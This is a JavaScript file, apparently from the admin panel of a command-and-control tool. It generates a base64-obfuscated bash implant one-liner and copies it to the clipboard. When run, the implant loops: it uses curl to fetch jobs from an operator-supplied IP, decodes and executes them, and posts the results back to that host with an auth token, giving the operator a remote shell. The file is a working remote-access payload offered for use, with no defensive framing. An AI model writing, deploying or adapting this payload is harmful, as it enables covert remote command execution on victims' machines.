const btncpy = document.getElementById("btn-copy")
const inpip = document.getElementById("ip") 

function getpayload() {
  let payload_src = `
uid=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 7 | head -n 1)
url="${location.protocol}//${inpip.value}:${location.port}"
tok="${token}"

while true; do
  script=$(curl -s $url/shell/job?u=$uid\\&t=$tok)
  if [[ "$?" != "0" ]]; then
    break
  fi
  dec=$(echo $script | base64 -d)

  res=$(echo \${dec} | $0)
  code="$?"

  if [ "$res" == "QUIT" ]; then 
    break
  fi
  curl -s -d "\${res}" $url/shell/result?u=$uid\\&c=$code\\&t=$tok

  sleep 3
done
pkill -9 -P $$`

  return `echo ${btoa(payload_src)} | base64 -d | bash`
}

function updatebtn(){
  let prev = btncpy.innerText
  btncpy.innerText = "👍 copied!"
  setTimeout(()=>{
    btncpy.innerText = prev 
  }, 1000)
}

btncpy.addEventListener("click", ()=>{
  try {
    navigator.clipboard.writeText(getpayload())
    updatebtn()
  } catch(e) {
    console.log(e)
    alert(getpayload())
  }
})

setInterval(async ()=>{
  const res = await fetch("/admin/status", {credentials: "include"})
  if(status != await res.text())
    location.href = "/admin"
}, 5000)
